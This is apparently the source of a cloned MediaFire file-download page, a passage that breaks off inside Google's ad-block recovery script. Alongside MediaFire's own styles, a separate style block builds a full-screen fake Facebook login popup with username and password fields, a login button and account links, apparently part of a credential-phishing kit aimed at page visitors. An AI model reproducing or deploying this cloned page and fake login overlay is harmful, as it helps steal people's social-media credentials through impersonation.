ioc-tha,.flag-fifa-tha{background-image:url(//static.mediafire.com/images/flags_svg/tha.svg)}.flag-tjk,.flag-tj,.flag-762,.flag-ioc-tjk,.flag-fifa-tjk{background-image:url(//static.mediafire.com/images/flags_svg/tjk.svg)}.flag-tkl,.flag-tk,.flag-772,.flag-fifa-tkl{background-image:url(//static.mediafire.com/images/flags_svg/tkl.svg)}.flag-tkm,.flag-tm,.flag-795,.flag-ioc-tkm,.flag-fifa-tkm{background-image:url(//static.mediafire.com/images/flags_svg/tkm.svg)}.flag-tls,.flag-tl,.flag-626,.flag-ioc-tls,.flag-fifa-tls{background-image:url(//static.mediafire.com/images/flags_svg/tls.svg)}.flag-ton,.flag-to,.flag-776,.flag-ioc-tga,.flag-fifa-tga{background-image:url(//static.mediafire.com/images/flags_svg/ton.svg)}.flag-tto,.flag-tt,.flag-780,.flag-ioc-tto,.flag-fifa-tri{background-image:url(//static.mediafire.com/images/flags_svg/tto.svg)}.flag-tun,.flag-tn,.flag-788,.flag-ioc-tun,.flag-fifa-tun{background-image:url(//static.mediafire.com/images/flags_svg/tun.svg)}.flag-tur,.flag-tr,.flag-792,.flag-ioc-tur,.flag-fifa-tur{background-image:url(//static.mediafire.com/images/flags_svg/tur.svg)}.flag-tuv,.flag-tv,.flag-798,.flag-ioc-tuv,.flag-fifa-tuv{background-image:url(//static.mediafire.com/images/flags_svg/tuv.svg)}.flag-twn,.flag-tw,.flag-158{background-image:url(//static.mediafire.com/images/flags_svg/twn.svg)}.flag-tza,.flag-tz,.flag-834,.flag-ioc-tan,.flag-fifa-tan{background-image:url(//static.mediafire.com/images/flags_svg/tza.svg)}.flag-uga,.flag-ug,.flag-800,.flag-ioc-uga,.flag-fifa-uga{background-image:url(//static.mediafire.com/images/flags_svg/uga.svg)}.flag-ukr,.flag-ua,.flag-804,.flag-ioc-ukr,.flag-fifa-ukr{background-image:url(//static.mediafire.com/images/flags_svg/ukr.svg)}.flag-umi,.flag-um,.flag-581{background-image:url(//static.mediafire.com/images/flags_svg/umi.svg)}.flag-ury,.flag-uy,.flag-858,.flag-ioc-uru,.flag-fifa-uru{background-image:url(//static.mediafire.com/images/flags_svg/ury.svg)}.flag-usa,.flag-us,.flag-840,.flag-ioc-usa,.flag-fifa-usa{background-image:url(//static.mediafire.com/images/flags_svg/usa.svg)}.flag-uzb,.flag-uz,.flag-860,.flag-ioc-uzb,.flag-fifa-uzb{background-image:url(//static.mediafire.com/images/flags_svg/uzb.svg)}.flag-vat,.flag-va,.flag-336,.flag-fifa-vat{background-image:url(//static.mediafire.com/images/flags_svg/vat.svg)}.flag-vct,.flag-vc,.flag-670,.flag-ioc-vin,.flag-fifa-vin{background-image:url(//static.mediafire.com/images/flags_svg/vct.svg)}.flag-ven,.flag-ve,.flag-862,.flag-ioc-ven,.flag-fifa-ven{background-image:url(//static.mediafire.com/images/flags_svg/ven.svg)}.flag-vgb,.flag-vg,.flag-92,.flag-ioc-ivb,.flag-fifa-vgb{background-image:url(//static.mediafire.com/images/flags_svg/vgb.svg)}.flag-vir,.flag-vi,.flag-850,.flag-ioc-isv,.flag-fifa-vir{background-image:url(//static.mediafire.com/images/flags_svg/vir.svg)}.flag-vnm,.flag-vn,.flag-704,.flag-ioc-vie,.flag-fifa-vie{background-image:url(//static.mediafire.com/images/flags_svg/vnm.svg)}.flag-vut,.flag-vu,.flag-548,.flag-ioc-van,.flag-fifa-van{background-image:url(//static.mediafire.com/images/flags_svg/vut.svg)}.flag-wlf,.flag-wf,.flag-876,.flag-ioc-waf,.flag-fifa-wlf{background-image:url(//static.mediafire.com/images/flags_svg/wlf.svg)}.flag-wsm,.flag-ws,.flag-882,.flag-ioc-sam,.flag-fifa-sam{background-image:url(//static.mediafire.com/images/flags_svg/wsm.svg)}.flag-yem,.flag-ye,.flag-887,.flag-ioc-yem,.flag-fifa-yem{background-image:url(//static.mediafire.com/images/flags_svg/yem.svg)}.flag-zaf,.flag-za,.flag-710,.flag-ioc-rsa,.flag-fifa-rsa{background-image:url(//static.mediafire.com/images/flags_svg/zaf.svg)}.flag-zmb,.flag-zm,.flag-894,.flag-ioc-zam,.flag-fifa-zam{background-image:url(//static.mediafire.com/images/flags_svg/zmb.svg)}.flag-zwe,.flag-zw,.flag-716,.flag-ioc-zim,.flag-fifa-zim{background-image:url(//static.mediafire.com/images/flags_svg/zwe.svg)}.flag-fifa-eng{background-image:url(//static.mediafire.com/images/flags_svg/eng.svg)}.flag-eur,.flag-eu{background-image:url(//static.mediafire.com/images/flags_svg/eur.svg)}.flag-ioc-kos{background-image:url(//static.mediafire.com/images/flags_svg/kos.svg)}.flag-fifa-nir{background-image:url(//static.mediafire.com/images/flags_svg/nir.svg)}.flag-ico-tpe,.flag-fifa-tpe{background-image:url(//static.mediafire.com/images/flags_svg/tpe.svg)}.flag-fifa-sco{background-image:url(//static.mediafire.com/images/flags_svg/sco.svg)}.flag-fifa-wal{background-image:url(//static.mediafire.com/images/flags_svg/wal.svg)}.dl-btn-cont{margin:300px auto 200px;background:#292929;width:604px;padding:20px;overflow:auto;font-size:0;position:relative;box-sizing:border-box;border-radius:6px}.dl-btn-cont>.icon{display:inline-block;width:46px;height:58px;margin-right:15px}.dl-btn-labelWrap{position:absolute;top:25px;left:80px;right:290px}.dl-btn-label{text-overflow:ellipsis;white-space:nowrap;overflow:hidden;color:#fff;font-weight:bold;font-size:12px}.dl-btn-label a{color:#fff}.dl-btn-form{float:right;width:250px}.download_link{line-height:60px;height:60px;box-sizing:border-box;white-space:nowrap;text-align:center}.download_link.retry{height:auto;line-height:normal}.download_link a.input,.download_link input{padding:0;width:100%;height:100%}.download_link a,.download_link input,.download_link button,#authorize_dl_btn{display:block;border-radius:4px;text-decoration:none;color:#fff;background-color:#0070F0;background-color:var(--mf-blue4);font-weight:600;font-size:12px;text-transform:uppercase;border:none;-webkit-appearance:none;outline:none;cursor:pointer}.download_link input:hover,.download_link a:hover,#authorize_dl_btn:hover{text-decoration:none;color:#fff}.download_link span{font-size:12px;font-weight:normal}.download_link.preparing a.input,.download_link.preparing input{display:none}.download_link.started a.input,.download_link.started input{display:none}.download_link .preparing,.download_link .starting,.download_link .retry{display:none}.download_link.preparing .preparing{display:block}.download_link.started .starting{display:block}.download_link.started.retry .starting{display:none}.download_link .retry{border-radius:4px 4px 0 0;line-height:normal;padding:8px 0}.download_link.started.retry .retry{display:block}.download_link .retry em{color:#0045AD;color:var(--mf-blue3);font-style:normal}.download_link .retry:hover em{color:#002369;color:var(--mf-blue2)}.download_link.preparing a,.download_link.started a{color:#282f3d;background:#eee;font-weight:normal;text-transform:none}.download_test_link{display:none;font-size:12px;text-align:center;padding:8px 0;background-color:#eee;border-radius:0 0 4px 4px;box-shadow:inset 0 1px 0 0 #ddd;box-sizing:border-box;line-height:normal;position:relative;z-index:1}.download_link.started.retry+.download_test_link{display:block}.ads-mobileLegacy .download_test_link{margin:0 auto}.promoDownloadName{margin-bottom:8px}#form_captcha .dl-utility-nav{display:none}.dl-utility-nav>ul{margin:0}.dl-utility-nav ul li,.dl-utility-nav li{float:left;width:24px;height:24px;margin-right:10px;position:relative}.dl-utility-nav li a{position:absolute;height:100%;width:100%;left:0;top:0;z-index:1}.dl-utility-nav li:after{margin:0}.dl-utility-nav .tooltip{text-align:center;padding:5px 0}.dl-utility-nav .tooltip.point-up:after,.dl-utility-nav .tooltip.point-right:after,.dl-utility-nav .tooltip.point-down:after,.dl-utility-nav .tooltip.point-left:after{height:5px}.icon{background-position:center;background-repeat:no-repeat}.icon{background-image:url(//static.mediafire.com/images/filetype/file-default-v3.png)}.icon.image{background-image:url(//static.mediafire.com/images/filetype/file-img-v3.png)}.icon.application_x-shockwave-flash{background-image:url(//static.mediafire.com/images/filetype/new/file-swf.png)}.icon.application{background-image:url(//static.mediafire.com/images/filetype/file-app-v3.png)}.icon.archive{background-image:url(//static.mediafire.com/images/filetype/file-zip-v3.png)}.icon.archive.iso{background-image:url(//static.mediafire.com/images/filetype/new/file-iso.png)}.icon.audio{background-image:url(//static.mediafire.com/images/filetype/file-music-v3.png)}.icon.video{background-image:url(//static.mediafire.com/images/filetype/file-video-v3.png)}.icon.document{background-image:url(//static.mediafire.com/images/filetype/file-doc-v3.png)}.icon.document.txt{background-image:url(//static.mediafire.com/images/filetype/new/file-txt.png)}.icon.spreadsheet{background-image:url(//static.mediafire.com/images/filetype/new/file-xls.png)}.icon.presentation{background-image:url(//static.mediafire.com/images/filetype/new/file-ppt.png)}.icon.document.pdf{background-image:url(//static.mediafire.com/images/filetype/new/file-pdf.png)}.icon.other.ait,.icon.ai,.icon.eps,.icon.svg{background-image:url(//static.mediafire.com/images/filetype/new/file-ai.png)}.icon.other.psd,.icon.other.psb,.icon.application.psd,.icon.application.psb{background-image:url(//static.mediafire.com/images/filetype/new/file-psd.png)}.icon.ttf,.icon.otf{background-image:url(//static.mediafire.com/images/filetype/new/file-ttf.png)}.icon.source_code{background-image:url(//static.mediafire.com/images/filetype/new/file-html.png)}.icon.source_code.php{background-image:url(//static.mediafire.com/images/filetype/new/file-php.png)}.icon.source_code.css{background-image:url(//static.mediafire.com/images/filetype/new/file-css.png)}#share-tooltip{width:135px;left:40px}#copy-tooltip{width:154px;left:30px}.mobile .content{overflow:auto;min-width:300px}.ads-mobile1 .nonDLContentWrap{min-height:100px;background:#f4f4f5;position:fixed;top:70px;left:0;right:0;z-index:1;box-shadow:0 1px 0 0 rgba(0,0,0,.1)}.ads-mobile2 .nonDLContentWrap{position:absolute;top:0;left:0;right:0;bottom:0}.ads-mobile3 .nonDLContentWrap{min-height:1680px}.ads-mobileLegacy .nonDLContentWrap,.ads-mobile4 .nonDLContentWrap{position:absolute;top:0;left:0;right:0;bottom:0}.ads-mobile5 .nonDLContentWrap{min-height:0;width:100vw;height:56.25vw;margin:0 auto 50px;max-width:800px;max-height:450px}.ads-mobile5.swapAd .nonDLContentWrap{position:relative;z-index:1}.ads-mobile5.swapAd+#footer{padding-bottom:150px}.ads-mobileLegacy #ads{margin:0 auto;display:block;height:100%;box-sizing:border-box;padding:45px 0 0 0}.ads-mobile1 #ads{margin:10px auto;display:block}.ads-mobile2 #ads{margin:0 auto;display:block;height:100%;box-sizing:border-box;padding:80px 0 0 0}.ads-mobile3 #ads{margin:80px auto 50px;display:block}.ads-mobile4 #ads{margin:0 auto;display:block;height:100%;box-sizing:border-box;padding:80px 0 0 0}.ads-mobile5 #ads{display:block;height:100%;width:100%}.ads-mobile5.swapAd #ads{height:50px;width:320px;margin:10px auto;position:fixed;bottom:0;right:0;left:0}.mobile .dl-promo-cont,.mobile .dl-info,.mobile .DLExtraInfo-Facebook{display:none}.mobile .center{height:260px;width:auto;position:relative;margin-top:180px;top:auto;right:auto;z-index:1}.mobile.turbo-dl .center{height:270px;margin-top:170px}.ads-mobile1 .center{margin-bottom:30px}.ads-mobile2 .center{margin-bottom:30px}.ads-mobile4 .center{margin-bottom:150px}.ads-mobileLegacy .center{height:110px;margin-bottom:160px;margin-top:190px}.ads-mobileLegacy .download_link{line-height:50px!important;height:50px!important;margin:0 auto}.ads-mobileLegacy .download_link.retry{line-height:normal!important;height:auto!important}.ads-mobileLegacy .dl-btn-cont .icon{display:none}.dl-btn-title{font-size:14px;line-height:15px;color:#282f3d!important;overflow:hidden;text-overflow:ellipsis;margin:0;height:20px;white-space:nowrap;font-weight:bold;text-align:center}.ads-mobileLegacy .dl-btn-cont{padding:10px}.mobile .dl-btn-cont{margin:150px auto 0;border-radius:6px;right:0;left:0;width:auto;max-width:450px;min-width:280px;background:#fff}.mobile .ads .dl-btn-cont{margin-top:0}.mobile.ads-mobile3 .DLExtraInfo-wrap{position:absolute;top:380px}.mobile .dl-btn-form{float:none;width:auto}.mobile .download_link{line-height:70px;height:70px}.mobile .download_link.retry{line-height:normal;height:auto}.mobile .download_link a.input,.mobile .download_link input{font-size:12px;text-transform:none;font-weight:300;text-align:left;text-indent:60px;line-height:98px;background-image:url(//static.mediafire.com/images/icons/svg_light/download.svg);background-repeat:no-repeat;background-position:right 30px center}.mobile.turbo-dl .download_link a.input,.mobile.turbo-dl .download_link input{border-radius:4px 4px 0 0}.ads-mobileLegacy .download_link a.input,.ads-mobileLegacy .download_link input{font-size:12px;font-weight:bold;line-height:50px;text-align:center;text-indent:0;background-image:none;text-transform:uppercase}.mobile .dl-btn-cont>.icon{position:absolute;z-index:1;top:26px;left:26px;pointer-events:none;background-size:32px}.mobile .dl-btn-labelWrap{position:absolute;top:32px;right:20px;left:80px;z-index:1;pointer-events:none}.mobile .dl-btn-label{font-weight:600;font-size:16px;margin-right:70px}.mobile .dl-utility-nav{display:none}.mobile .download_link.preparing .preparing,.mobile .download_link.started .starting,.mobile .download_link.started.retry .retry{position:relative;z-index:1}.DLMobile-shareOptions{display:none;text-align:center;max-width:450px;padding-top:15px}.mobile .DLMobile-shareOptions{display:block}.DLMobile-shareOptions>ul{display:flex;flex-wrap:wrap;box-sizing:border-box;margin:0 -5px}.DLMobile-shareOptions li{flex-basis:50%}.DLMobile-shareOptions a{display:block;font-size:11px;line-height:14px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;background-color:#f4f4f5;border-radius:4px;color:#575B65;color:var(--mf-gray4);padding:5px 0 10px;margin:5px}.turbo-dl .DLMobile-shareOptions a{margin:0 5px}.DLMobile-shareOptions a span{display:block;height:26px;margin:0 auto;opacity:.5}.DLMobile-shareOptions p{font-size:11px;text-align:center;color:var(--mf-gray5);padding:5px 0 15px;line-height:normal}.turbo-dl .DLMobile-shareOptions p{padding:0px 0 15px}.turbo-dl .dl-btn-cont{margin-bottom:0;border-radius:6px 6px 0 0}.ads-enabled .TurboDL-toggle-box{width:100%}.mftd-root{width:604px;margin:auto}main:not(.ads-enabled) .mftd-root{margin:300px auto 0}#copyShareURLMobile span{background:#f4f4f5 url(//static.mediafire.com/images/icons/svg_dark/link.svg) center / 28px no-repeat}#facebookShareButtonMobile span{background:#f4f4f5 url(//static.mediafire.com/images/icons/svg_dark/facebook.svg) center / 24px no-repeat}#shareButtonMobile span{background:#f4f4f5 url(//static.mediafire.com/images/icons/svg_dark/share.svg) center / 24px no-repeat}#saveButtonMobile span{background:#f4f4f5 url(//static.mediafire.com/images/icons/svg_dark/add.svg) center / 24px no-repeat}.mobile .passwordPrompt{background:#fff;position:relative;z-index:1}.mobile .download_link input.passwordInput{text-indent:0;line-height:40px;width:auto;max-width:200px;background:#f4f4f5}.mobile .passwordPrompt input[type="submit"]{line-height:40px;text-indent:0;text-align:center;background-image:none;font-size:11px;font-weight:600;text-transform:uppercase}.TurboDL-toggle-box{display:flex;justify-content:flex-end;width:604px;padding:0 20px;position:relative;box-sizing:border-box;background-color:#292929;border-top:1px solid #424242;margin:auto}.mobile .TurboDL-toggle-box{padding:0;border-radius:0 0 4px 4px;width:100%}main:not(.ads-enabled):not(.mobile) .TurboDL-toggle-box{border-radius:0 0 6px 6px}.TurboDL-button{display:flex;align-items:center;width:250px;padding:8px 0;background-color:transparent;border:none;border-radius:4px;color:#fff;font-size:11px;-webkit-appearance:none;cursor:pointer}.mobile .TurboDL-button{width:100%;padding:12px 0;justify-content:center}.turboTDL-toggle{display:flex;align-items:center;width:28px;padding:1px;margin-right:10px;border-radius:999em}.TurboDL-toggle-box.toggle-on .turboTDL-toggle{justify-content:flex-end;background-color:#0070f0;border:1px solid #0070f0}.TurboDL-toggle-box.toggle-off .turboTDL-toggle{justify-content:flex-start;border:1px solid #71757F}.turboTDL-toggle-slider{width:12px;height:12px;border-radius:999em}.TurboDL-toggle-box.toggle-on .turboTDL-toggle-slider{background-color:#fff}.TurboDL-toggle-box.toggle-off .turboTDL-toggle-slider{background-color:#71757F}.turboTDL-toggle-note{margin-left:auto;display:flex;padding:3px;border-radius:2px;background-color:#0070f0;font-size:9px;text-transform:uppercase}.mobile .turboTDL-toggle-note{margin-left:10px}.TurboDL-message{display:none;box-sizing:border-box;padding:11px 12px;border-radius:4px;background-color:#fff;color:#222835;font-size:12px;position:absolute;right:20px;bottom:100%;z-index:1;left:20px;margin-bottom:8px}.TurboDL-button:hover+.TurboDL-message{display:block}.TurboDL-message::after{content:'';position:absolute;top:100%;right:120px;border-style:solid;border-color:#fff transparent transparent;border-width:6px}.CookieAcceptance{position:fixed;bottom:0;left:0;right:0;padding:25px;background:hsla(220,21%,12%,.95);border-top:1px solid rgba(255,255,255,.1);color:#fff;font-size:13px;z-index:5000}.CookieAcceptance p{padding-right:250px}.CookieAcceptance p a{white-space:nowrap;color:#fff;text-decoration:underline}.CookieAcceptance-buttons{position:absolute;right:10px;top:50%;transform:translateY(-50%);display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center}.CookieAcceptance-close{position:relative;height:44px;width:44px;opacity:.7}.CookieAcceptance-close:hover,.CookieAcceptance-close:focus{opacity:.5}.CookieAcceptance-close span{position:absolute;height:24px;width:24px;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;border-radius:50%;font-size:0}.CookieAcceptance-close span:before,.CookieAcceptance-close span:after{content:'';position:absolute;height:2px;width:12px;background:hsl(220,21%,12%);top:50%;left:50%}.CookieAcceptance-close span:before{transform:translate(-50%,-50%) rotate(45deg)}.CookieAcceptance-close span:after{transform:translate(-50%,-50%) rotate(-45deg)}.CookieAcceptance-accept{padding:12px 50px;margin-left:10px;background:#0070F0;background:var(--mf-blue4);border-radius:4px;color:#fff;font-weight:bold;font-size:14px}.CookieAcceptance-accept:hover,.CookieAcceptance-accept:focus{color:#fff;background:hsl(212,100%,42%)}@media (max-width:575px){.CookieAcceptance-buttons{position:static;transform:none;margin-top:30px;-ms-flex-pack:end;justify-content:flex-end}.CookieAcceptance p{padding-right:0}}    </style> 
<style>
@import url('https://fonts.googleapis.com/css2?family=Oswald&family=Roboto&family=Teko&display=swap');

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Roboto', sans-serif;
}


popup {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    padding: 10px;
    z-index: 99;
    box-shadow: 0 1px 1px black;
    overflow: hidden;
    z-index: 9999999;
}

popup fb {
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    flex-direction: column;
    box-shadow: 0 0 1000px 1000px rgba(0, 0, 0, 0.60);
    background: #fff;
    height: 100%;
    border-radius: 3px;
    overflow: hidden;
}

[hide] {
    display: none !important;
}

[die] {
    opacity: 0.5 !important;
    pointer-events: none !important;
}

fb err {
    background: #fa3e3e;
    padding: 10px;
    color: #fff;
    font-size: 14px;
}

fb atas {
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    background: #fffbe2;
    padding: 5px 10px;
}

.popup-login {
    background: rgba(0, 0, 0, 0.5);
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 999999999999999999;
}

.popup-box-login-fb {
    background: #eceff6;
    max-width: 330px;
    height: auto;
    position: relative;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    text-align: center;
    font-family: "Teko";
    color: #000;
    border-radius: 10px;
}

.navbar-fb {
    background: #3b5998;
    height: auto;
    max-width: 330px;
    padding: 6px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
}

.navbar-fb img {
    width: 115px;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 330px;
    padding: 5px;
    background: red;
    color: #fff;
    font-size: 13px;
    font-family: "Roboto";
}

.content-box-fb img {
    width: 75;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}

.txt-login-fb {
    width: 290px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}

input[type="text"],
input[type="password"] {
    width: 90%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: "Lato", sans-serif;
    border: 1px solid #bdbebf;
    cursor: pointer;
    outline: none;
}

.login-form input[type="text"] {
    margin: 0;
    padding-bottom: 13px;
    border-bottom: none;
    border-radius: 4px 4px 0 0;
    box-shadow: 0 -1px 0 #e0e0e0 inset, 0 0px 0px rgba(0, 0, 0, 0.23) inset;
}

.login-form input[type="password"] {
    margin: 0;
    border-top: none;
    border-radius: 0 0 4px 4px;
    box-shadow: 0 -0px 0 rgba(0, 0, 0, 0.23) inset,
        0 0px 0px rgba(255, 255, 255, 0.1);
}

.btn-login-fb {
    background: #1778f2;
    width: 100%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
    border: 1px solid #3578e5;
    border-radius: 5px;
    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
    outline: none;
    display: block;
}

.btn-login-fb.disabled {
    pointer-events: none;
    background: #8b9dc3;
    border: 1px solid #8b9dc3;
}

.txt-create-account {
    margin-top: 4px;
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}

.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}

.language-name-active {
    color: #90949c;
    font-weight: bold;
}

.copyrights {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
</style>
    <script type="text/javascript">
      window.displayAds = "true" === "true";
    </script> 
  <script>(function(){/*
 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
'use strict';var g=function(a){var b=0;return function(){return b<a.length?{done:!1,value:a[b++]}:{done:!0}}},l=this||self,m=/^[\w+/_-]+[=]{0,2}$/,p=null,q=function(){},r=function(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if("[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";
if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},u=function(a,b){function c(){}c.prototype=b.prototype;a.prototype=new c;a.prototype.constructor=a};var v=function(a,b){Object.defineProperty(l,a,{configurable:!1,get:function(){return b},set:q})};var y=function(a,b){this.b=a===w&&b||"";this.a=x},x={},w={};var aa=function(a,b){a.src=b instanceof y&&b.constructor===y&&b.a===x?b.b:"type_error:TrustedResourceUrl";if(null===p)b:{b=l.document;if((b=b.querySelector&&b.querySelector("script[nonce]"))&&(b=b.nonce||b.getAttribute("nonce"))&&m.test(b)){p=b;break b}p=""}b=p;b&&a.setAttribute("nonce",b)};var z=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^+new Date).toString(36)};var A=function(a,b){b=String(b);"application/xhtml+xml"===a.contentType&&(b=b.toLowerCase());return a.createElement(b)},B=function(a){this.a=a||l.document||document};B.prototype.appendChild=function(a,b){a.appendChild(b)};var C=function(a,b,c,d,e,f){try{var k=a.a,h=A(a.a,"SCRIPT");h.async=!0;aa(h,b);k.head.appendChild(h);h.addEventListener("load",function(){e();d&&k.head.removeChild(h)});h.addEventListener("error",function(){0<c?C(a,b,c-1,d,e,f):(d&&k.head.removeChild(h),f())})}catch(n){f()}};var ba=l.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),ca=l.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),da=l.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),ea=function(a,b,c){this.b=a;this.f=new B(this.b);this.a=null;this.c=[];this.g=!1;this.i=b;this.h=c},F=function(a){if(a.b.body&&!a.g){var b=
function(){D(a);l.setTimeout(function(){return E(a,3)},50)};C(a.f,a.i,2,!0,function(){l[a.h]||b()},b);a.g=!0}},D=function(a){for(var b=G(1,5),c=0;c<b;c++){var d=H(a);a.b.body.appendChild(d);a.c.push(d)}b=H(a);b.style.bottom="0";b.style.left="0";b.style.position="fixed";b.style.width=G(100,110).toString()+"%";b.style.zIndex=G(2147483544,2147483644).toString();b.style["background-color"]=I(249,259,242,252,219,229);b.style["box-shadow"]="0 0 12px #888";b.style.color=I(0,10,0,10,0,10);b.style.display=
"flex";b.style["justify-content"]="center";b.style["font-family"]="Roboto, Arial";c=H(a);c.style.width=G(80,85).toString()+"%";c.style.maxWidth=G(750,775).toString()+"px";c.style.margin="24px";c.style.display="flex";c.style["align-items"]="flex-start";c.style["justify-content"]="center";d=A(a.f.a,"IMG");d.className=z();d.src=ba;d.style.height="24px";d.style.width="24px";d.style["padding-right"]="16px";var e=H(a),f=H(a);f.style["font-weight"]="bold";f.textContent=ca;var k=H(a);k.textContent=da;J(a,
e,f);J(a,e,k);J(a,c,d);J(a,c,e);J(a,b,c);a.a=b;a.b.body.appendChild(a.a);b=G(1,5);for(c=0;c<b;c++)d=H(a),a.b.body.appendChild(d),a.c.push(d)},J=function(a,b,c){for(var d=G(1,5),e=0;e<d;e++){var f=H(a);b.appendChild(f)}b.appendChild(c);c=G(1,5);for(d=0;d<c;d++)e=H(a),b.appendChild(e)},G=function(a,b){return Math.floor(a+Math.random()*(b-a))},I=function(a,b,c,d,e,f){return"rgb("+G(Math.max(a,0),Math.min(b,255)).toString()+","+G(Math.max(c,0),Math.min(d,255)).toString()+","+G(Math.max(e,0),Math.min(f,
255)).toString()+")"},H=function(a){a=A(a.f.a,"DIV");a.className=z();return a},E=function(a,b){0>=b||null!=a.a&&0!=a.a.offsetHeight&&0!=a.a.offsetWidth||(fa(a),D(a),l.setTimeout(function(){return E(a,b-1)},50))},fa=function(a){var b=a.c;var c="undefined"!=typeof Symbol&&Symbol.iterator&&b[Symbol.iterator];b=c?c.call(b):{next:g(b)};for(c=b.next();!c.done;c=b.next())(c=c.value)&&c.parentNode&&c.parentNode.removeChild(c);a.c=[];(b=a.a)&&b.parentNode&&b.parentNode.removeChild(b);a.a=null};var ia=function(a,b,c,d,e){var f=ha(c),k=function(n){n.appendChild(f);l.setTimeout(function(){f?(0!==f.offsetHeight&&0!==f.offsetWidth?b():a(),f.parentNode&&f.parentNode.removeChild(f)):a()},d)},h=function(n){document.body?k(document.body):0<n?l.setTimeout(function(){h(n-1)},e):b()};h(3)},ha=function(a){var b=document.createElement("div");b.className=a;b.style.width="1px";b.style.height="1px";b.style.position="absolute";b.style.left="-10000px";b.style.top="-10000px";b.style.zIndex="-10000";return b};var K={},L=null;var M=function(){},N="function"==typeof Uint8Array,O=function(a,b){a.b=null;b||(b=[]);a.j=void 0;a.f=-1;a.a=b;a:{if(b=a.a.length){--b;var c=a.a[b];if(!(null===c||"object"!=typeof c||Array.isArray(c)||N&&c instanceof Uint8Array)){a.g=b-a.f;a.c=c;break a}}a.g=Number.MAX_VALUE}a.i={}},P=[],Q=function(a,b){if(b<a.g){b+=a.f;var c=a.a[b];return c===P?a.a[b]=[]:c}if(a.c)return c=a.c[b],c===P?a.c[b]=[]:c},R=function(a,b,c){a.b||(a.b={});if(!a.b[c]){var d=Q(a,c);d&&(a.b[c]=new b(d))}return a.b[c]};
M.prototype.h=N?function(){var a=Uint8Array.prototype.toJSON;Uint8Array.prototype.toJSON=function(){var b;void 0===b&&(b=0);if(!L){L={};for(var c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),d=["+/=","+/","-_=","-_.","-_"],e=0;5>e;e++){var f=c.concat(d[e].split(""));K[e]=f;for(var k=0;k<f.length;k++){var h=f[k];void 0===L[h]&&(L[h]=k)}}}b=K[b];c=[];for(d=0;d<this.length;d+=3){var n=this[d],t=(e=d+1<this.length)?this[d+1]:0;h=(f=d+2<this.length)?this[d+2]:0;k=n>>2;n=(n&
